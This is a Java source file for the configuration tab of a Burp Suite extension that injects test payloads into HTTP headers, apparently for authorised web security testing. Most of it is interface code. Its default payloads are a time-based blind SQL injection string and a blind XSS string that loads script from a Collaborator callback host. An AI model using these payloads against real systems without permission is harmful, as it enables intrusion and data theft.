package slicingmelon.burpheaderbanger;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorPayload;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ItemEvent;

public class HeaderBangerTab {
    private final BurpHeaderBanger extension;
    private final MontoyaApi api;
    
    private JTabbedPane tabbedPane;
    private JCheckBox activeCheckBox;
    private JCheckBox onlyInScopeCheckBox;
    private JCheckBox addOnlyIfNotExistsCheckBox;
    private JButton sqliButton;
    private JButton xssButton;
    private DefaultListModel<String> headersListModel;
    private DefaultListModel<String> sensitiveHeadersListModel;
    private DefaultListModel<String> hostsListModel;
    private DefaultListModel<String> extraHeadersListModel;
    private JList<String> headersList;
    private JList<String> sensitiveHeadersList;
    private JList<String> hostsList;
    private JList<String> extraHeadersList;
    private JTextField newHeaderField;
    private JTextField newSensitiveHeaderField;
    private JTextField newHostField;
    private JTextField newExtraHeaderField;
    private JTextArea sqliPayloadField;
    private JTextArea bxssPayloadField;

    public HeaderBangerTab(BurpHeaderBanger extension, MontoyaApi api) {
        this.extension = extension;
        this.api = api;
        createUI();
    }

    public JTabbedPane getTabbedPane() {
        return tabbedPane;
    }

    private void createUI() {
        tabbedPane = new JTabbedPane();
        
        // Create tabs
        JPanel attackModePanel = createAttackModePanel();
        JPanel headersPanel = createHeadersAndPayloadsPanel();
        JPanel excludedHostsPanel = createExcludedHostsPanel();
        
        tabbedPane.addTab("Attack Mode", attackModePanel);
        tabbedPane.addTab("Headers and Payloads", headersPanel);
        tabbedPane.addTab("Excluded Hosts", excludedHostsPanel);
    }

    private JPanel createAttackModePanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Active panel
        JPanel activePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        activeCheckBox = new JCheckBox("Active", extension.isExtensionActive());
        activeCheckBox.addItemListener(e -> {
            extension.setExtensionActive(e.getStateChange() == ItemEvent.SELECTED);
            extension.saveSettings();
            api.logging().logToOutput("Extension is now " + (extension.isExtensionActive() ? "active" : "inactive"));
        });
        activePanel.add(activeCheckBox);
        
        onlyInScopeCheckBox = new JCheckBox("Only in scope items", extension.isOnlyInScopeItems());
        onlyInScopeCheckBox.addItemListener(e -> {
            extension.setOnlyInScopeItems(e.getStateChange() == ItemEvent.SELECTED);
            extension.saveSettings();
            api.logging().logToOutput("Only in scope items is now " + (extension.isOnlyInScopeItems() ? "enabled" : "disabled"));
        });
        activePanel.add(onlyInScopeCheckBox);
        
        // Attack mode panel
        JPanel attackModePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        attackModePanel.add(new JLabel("Select the attack mode:"));
        
        sqliButton = new JButton("Blind SQL Injection");
        sqliButton.addActionListener(_ -> setAttackMode(1));
        
        xssButton = new JButton("Blind XSS");
        xssButton.addActionListener(_ -> setAttackMode(2));
        
        attackModePanel.add(sqliButton);
        attackModePanel.add(xssButton);
        
        panel.add(activePanel, BorderLayout.NORTH);
        panel.add(attackModePanel, BorderLayout.CENTER);
        
        updateAttackModeButtons();
        
        return panel;
    }

    private void setAttackMode(int mode) {
        extension.setAttackMode(mode);
        extension.updateInjectedHeaders();
        updateAttackModeButtons();
        extension.saveSettings();
        api.logging().logToOutput("Attack mode set to " + (mode == 1 ? "Blind SQL Injection" : "Blind XSS"));
    }

    private void updateAttackModeButtons() {
        if (extension.getAttackMode() == 1) {
            sqliButton.setBackground(Color.GREEN);
            xssButton.setBackground(null);
        } else {
            sqliButton.setBackground(null);
            xssButton.setBackground(Color.GREEN);
        }
    }

    private JPanel createHeadersAndPayloadsPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Top panel with checkbox
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        addOnlyIfNotExistsCheckBox = new JCheckBox("Add extra headers only if they don't exist (unchecked = overwrite existing)", !extension.isOverwriteExtraHeaders());
        addOnlyIfNotExistsCheckBox.addItemListener(e -> {
            extension.setOverwriteExtraHeaders(e.getStateChange() != ItemEvent.SELECTED);
            extension.saveSettings();
            api.logging().logToOutput("Extra headers mode: " + (extension.isOverwriteExtraHeaders() ? "overwrite existing" : "add only if not exists"));
        });
        topPanel.add(addOnlyIfNotExistsCheckBox);
        
        // Main content panel using BoxLayout for better balance
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        
        // Headers section (compact)
        JPanel headersSection = new JPanel(new GridLayout(1, 3, 10, 0));
        headersSection.setBorder(BorderFactory.createTitledBorder("Headers Configuration"));
        headersSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 200)); // Limit maximum height
        
        // Headers panel
        JPanel headersPanel = createHeadersPanel();
        headersPanel.setBorder(BorderFactory.createTitledBorder("Headers"));
        headersSection.add(headersPanel);
        
        // Sensitive headers panel
        JPanel sensitiveHeadersPanel = createSensitiveHeadersPanel();
        sensitiveHeadersPanel.setBorder(BorderFactory.createTitledBorder("Sensitive Headers"));
        headersSection.add(sensitiveHeadersPanel);
        
        // Extra headers panel
        JPanel extraHeadersPanel = createExtraHeadersPanel();
        extraHeadersPanel.setBorder(BorderFactory.createTitledBorder("Extra Headers"));
        headersSection.add(extraHeadersPanel);
        
        // Add some spacing
        mainPanel.add(headersSection);
        mainPanel.add(Box.createVerticalStrut(15)); // Add spacing between sections
        
        // Payloads section (more prominent)
        JPanel payloadsSection = new JPanel(new GridLayout(1, 2, 20, 0));
        payloadsSection.setBorder(BorderFactory.createTitledBorder("Payloads Configuration"));
        payloadsSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 150)); // Limit maximum height
        
        // SQLi payload panel
        JPanel sqliPanel = createSqliPayloadPanel();
        sqliPanel.setBorder(BorderFactory.createTitledBorder("SQL Injection Payload"));
        payloadsSection.add(sqliPanel);
        
        // XSS payload panel
        JPanel xssPanel = createXssPayloadPanel();
        xssPanel.setBorder(BorderFactory.createTitledBorder("Blind XSS Payload"));
        payloadsSection.add(xssPanel);
        
        mainPanel.add(payloadsSection);
        mainPanel.add(Box.createVerticalGlue()); // Push everything up
        
        // Add everything to the main panel
        panel.add(topPanel, BorderLayout.NORTH);
        panel.add(mainPanel, BorderLayout.CENTER);
        
        return panel;
    }

    private JPanel createHeadersPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        headersListModel = new DefaultListModel<>();
        extension.getHeaders().forEach(headersListModel::addElement);
        headersList = new JList<>(headersListModel);
        headersList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane scrollPane = new JScrollPane(headersList);
        scrollPane.setPreferredSize(new Dimension(200, 500)); // Increased from 80 to 100 for better balance
        panel.add(scrollPane, BorderLayout.CENTER);
        
        // Input panel
        JPanel inputPanel = new JPanel(new BorderLayout());
        newHeaderField = new JTextField();
        newHeaderField.addActionListener(_ -> addHeader()); // Allow Enter key to add
        inputPanel.add(new JLabel("New header:"), BorderLayout.WEST);
        inputPanel.add(newHeaderField, BorderLayout.CENTER);
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 5, 0));
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addHeader());
        buttonPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteHeader());
        buttonPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearHeaders());
        buttonPanel.add(clearButton);
        
        JButton defaultButton = new JButton("Default");
        defaultButton.addActionListener(_ -> setDefaultHeaders());
        buttonPanel.add(defaultButton);
        
        // Controls panel
        JPanel controlsPanel = new JPanel(new BorderLayout());
        controlsPanel.add(inputPanel, BorderLayout.NORTH);
        controlsPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createSensitiveHeadersPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        sensitiveHeadersListModel = new DefaultListModel<>();
        extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
        sensitiveHeadersList = new JList<>(sensitiveHeadersListModel);
        sensitiveHeadersList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane scrollPane = new JScrollPane(sensitiveHeadersList);
        scrollPane.setPreferredSize(new Dimension(200, 500)); // Increased from 80 to 100 for better balance
        panel.add(scrollPane, BorderLayout.CENTER);
        
        // Input panel
        JPanel inputPanel = new JPanel(new BorderLayout());
        newSensitiveHeaderField = new JTextField();
        newSensitiveHeaderField.addActionListener(_ -> addSensitiveHeader()); // Allow Enter key to add
        inputPanel.add(new JLabel("New header:"), BorderLayout.WEST);
        inputPanel.add(newSensitiveHeaderField, BorderLayout.CENTER);
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 5, 0));
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addSensitiveHeader());
        buttonPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteSensitiveHeader());
        buttonPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearSensitiveHeaders());
        buttonPanel.add(clearButton);
        
        JButton defaultButton = new JButton("Default");
        defaultButton.addActionListener(_ -> setDefaultSensitiveHeaders());
        buttonPanel.add(defaultButton);
        
        // Controls panel
        JPanel controlsPanel = new JPanel(new BorderLayout());
        controlsPanel.add(inputPanel, BorderLayout.NORTH);
        controlsPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createSqliPayloadPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Info panel
        JPanel infoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JLabel infoLabel = new JLabel("Configure the SQL injection payload used for testing:");
        infoLabel.setFont(infoLabel.getFont().deriveFont(Font.PLAIN, 12f));
        infoPanel.add(infoLabel);
        
        // Payload text area - single line
        sqliPayloadField = new JTextArea(extension.getSqliPayload(), 1, 40); // Changed from 4 rows to 1 row, increased columns
        sqliPayloadField.setLineWrap(true);
        sqliPayloadField.setWrapStyleWord(true);
        // Removed custom font - use default for better readability
        sqliPayloadField.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        JScrollPane scrollPane = new JScrollPane(sqliPayloadField);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setPreferredSize(new Dimension(400, 50)); // Set a specific height for single-line
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        
        JButton saveButton = new JButton("Save Payload");
        saveButton.addActionListener(_ -> saveSqliPayload());
        buttonPanel.add(saveButton);
        
        JButton defaultButton = new JButton("Reset to Default");
        defaultButton.addActionListener(_ -> setDefaultSqliPayload());
        buttonPanel.add(defaultButton);
        
        // Assembly
        panel.add(infoPanel, BorderLayout.NORTH);
        panel.add(scrollPane, BorderLayout.CENTER);
        panel.add(buttonPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createXssPayloadPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Info panel
        JPanel infoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JLabel infoLabel = new JLabel("Configure the XSS payload used for testing:");
        infoLabel.setFont(infoLabel.getFont().deriveFont(Font.PLAIN, 12f));
        infoPanel.add(infoLabel);
        
        // Payload text area - single line
        bxssPayloadField = new JTextArea(extension.getBxssPayload(), 1, 40); // Changed from 4 rows to 1 row, increased columns
        bxssPayloadField.setLineWrap(true);
        bxssPayloadField.setWrapStyleWord(true);
        // Removed custom font - use default for better readability
        bxssPayloadField.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        JScrollPane scrollPane = new JScrollPane(bxssPayloadField);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setPreferredSize(new Dimension(400, 50)); // Set a specific height for single-line
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        
        JButton saveButton = new JButton("Save Payload");
        saveButton.addActionListener(_ -> saveBxssPayload());
        buttonPanel.add(saveButton);
        
        JButton defaultButton = new JButton("Reset to Default");
        defaultButton.addActionListener(_ -> setDefaultBxssPayload());
        buttonPanel.add(defaultButton);
        
        // Assembly
        panel.add(infoPanel, BorderLayout.NORTH);
        panel.add(scrollPane, BorderLayout.CENTER);
        panel.add(buttonPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createExtraHeadersPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        extraHeadersListModel = new DefaultListModel<>();
        extension.getExtraHeaders().forEach(extraHeadersListModel::addElement);
        extraHeadersList = new JList<>(extraHeadersListModel);
        extraHeadersList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane scrollPane = new JScrollPane(extraHeadersList);
        scrollPane.setPreferredSize(new Dimension(200, 500)); // Increased from 80 to 100 for better balance
        panel.add(scrollPane, BorderLayout.CENTER);
        
        // Input panel
        JPanel inputPanel = new JPanel(new BorderLayout());
        newExtraHeaderField = new JTextField();
        newExtraHeaderField.addActionListener(_ -> addExtraHeader()); // Allow Enter key to add
        inputPanel.add(new JLabel("New header:"), BorderLayout.WEST);
        inputPanel.add(newExtraHeaderField, BorderLayout.CENTER);
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 5, 0));
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addExtraHeader());
        buttonPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteExtraHeader());
        buttonPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearExtraHeaders());
        buttonPanel.add(clearButton);
        
        // Controls panel
        JPanel controlsPanel = new JPanel(new BorderLayout());
        controlsPanel.add(inputPanel, BorderLayout.NORTH);
        controlsPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createExcludedHostsPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        hostsListModel = new DefaultListModel<>();
        extension.getSkipHosts().forEach(hostsListModel::addElement);
        hostsList = new JList<>(hostsListModel);
        panel.add(new JScrollPane(hostsList), BorderLayout.CENTER);
        
        JPanel controlsPanel = new JPanel();
        newHostField = new JTextField(20);
        controlsPanel.add(newHostField);
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addHost());
        controlsPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteHost());
        controlsPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearHosts());
        controlsPanel.add(clearButton);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    // Header management methods
    private void addHeader() {
        String newHeader = newHeaderField.getText().trim();
        if (!newHeader.isEmpty() && !extension.getHeaders().contains(newHeader)) {
            extension.getHeaders().add(newHeader);
            headersListModel.addElement(newHeader);
            newHeaderField.setText("");
            extension.updateInjectedHeaders();
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Header already in list or empty");
        }
    }

    private void deleteHeader() {
        String selectedHeader = headersList.getSelectedValue();
        if (selectedHeader != null) {
            extension.getHeaders().remove(selectedHeader);
            headersListModel.removeElement(selectedHeader);
            extension.updateInjectedHeaders();
            extension.saveSettings();
        }
    }

    private void clearHeaders() {
        extension.getHeaders().clear();
        headersListModel.clear();
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    private void setDefaultHeaders() {
        extension.getHeaders().clear();
        headersListModel.clear();
        extension.getHeaders().addAll(extension.getDefaultHeaders());
        extension.getHeaders().forEach(headersListModel::addElement);
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    // Sensitive header management methods
    private void addSensitiveHeader() {
        String newHeader = newSensitiveHeaderField.getText().trim();
        if (!newHeader.isEmpty() && !extension.getSensitiveHeaders().contains(newHeader)) {
            extension.getSensitiveHeaders().add(newHeader);
            sensitiveHeadersListModel.addElement(newHeader);
            newSensitiveHeaderField.setText("");
            extension.updateInjectedHeaders();
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Sensitive header already in list or empty");
        }
    }

    private void deleteSensitiveHeader() {
        String selectedHeader = sensitiveHeadersList.getSelectedValue();
        if (selectedHeader != null) {
            extension.getSensitiveHeaders().remove(selectedHeader);
            sensitiveHeadersListModel.removeElement(selectedHeader);
            extension.updateInjectedHeaders();
            extension.saveSettings();
        }
    }

    private void clearSensitiveHeaders() {
        extension.getSensitiveHeaders().clear();
        sensitiveHeadersListModel.clear();
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    private void setDefaultSensitiveHeaders() {
        extension.getSensitiveHeaders().clear();
        sensitiveHeadersListModel.clear();
        extension.getSensitiveHeaders().addAll(extension.getDefaultSensitiveHeaders());
        extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    // Extra header management methods
    private void addExtraHeader() {
        String newHeader = newExtraHeaderField.getText().trim();
        if (!newHeader.isEmpty() && !extension.getExtraHeaders().contains(newHeader)) {
            extension.getExtraHeaders().add(newHeader);
            extraHeadersListModel.addElement(newHeader);
            newExtraHeaderField.setText("");
            extension.updateInjectedHeaders();
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Extra header already in list or empty");
        }
    }

    private void deleteExtraHeader() {
        String selectedHeader = extraHeadersList.getSelectedValue();
        if (selectedHeader != null) {
            extension.getExtraHeaders().remove(selectedHeader);
            extraHeadersListModel.removeElement(selectedHeader);
            extension.updateInjectedHeaders();
            extension.saveSettings();
        }
    }

    private void clearExtraHeaders() {
        extension.getExtraHeaders().clear();
        extraHeadersListModel.clear();
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    // Payload management methods
    private void saveSqliPayload() {
        String newPayload = sqliPayloadField.getText().trim();
        if (!newPayload.isEmpty()) {
            extension.setSqliPayload(newPayload);
            extension.extractSqliSleepTime();
            extension.updateInjectedHeaders();
            extension.saveSettings();
            JOptionPane.showMessageDialog(null, "SQL Injection payload saved successfully!", "Success", JOptionPane.INFORMATION_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(null, "The SQL Injection payload cannot be empty.", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void setDefaultSqliPayload() {
        String defaultPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
        extension.setSqliPayload(defaultPayload);
        sqliPayloadField.setText(defaultPayload);
        extension.extractSqliSleepTime();
        extension.updateInjectedHeaders();
        extension.saveSettings();
        JOptionPane.showMessageDialog(null, "SQL Injection payload reset to default!", "Success", JOptionPane.INFORMATION_MESSAGE);
    }

    private void saveBxssPayload() {
        String newPayload = bxssPayloadField.getText().trim();
        if (!newPayload.isEmpty()) {
            extension.setBxssPayload(newPayload);
            extension.updateInjectedHeaders();
            extension.saveSettings();
            JOptionPane.showMessageDialog(null, "Blind XSS payload saved successfully!", "Success", JOptionPane.INFORMATION_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(null, "The Blind XSS payload cannot be empty.", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void setDefaultBxssPayload() {
        CollaboratorPayload payload = extension.getCollaboratorClient().generatePayload();
        String defaultPayload = "Mozilla\"><img/src/onerror=import('//" + payload.toString() + "')>";
        extension.setBxssPayload(defaultPayload);
        bxssPayloadField.setText(defaultPayload);
        extension.updateInjectedHeaders();
        extension.saveSettings();
        JOptionPane.showMessageDialog(null, "Blind XSS payload reset to default!", "Success", JOptionPane.INFORMATION_MESSAGE);
    }

    // Host management methods
    private void addHost() {
        String newHost = newHostField.getText().trim();
        if (!newHost.isEmpty() && !extension.getSkipHosts().contains(newHost)) {
            extension.getSkipHosts().add(newHost);
            hostsListModel.addElement(newHost);
            newHostField.setText("");
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Host already in list or empty");
        }
    }

    private void deleteHost() {
        String selectedHost = hostsList.getSelectedValue();
        if (selectedHost != null) {
            extension.getSkipHosts().remove(selectedHost);
            hostsListModel.removeElement(selectedHost);
            extension.saveSettings();
        }
    }

    private void clearHosts() {
        extension.getSkipHosts().clear();
        hostsListModel.clear();
        extension.saveSettings();
    }
} 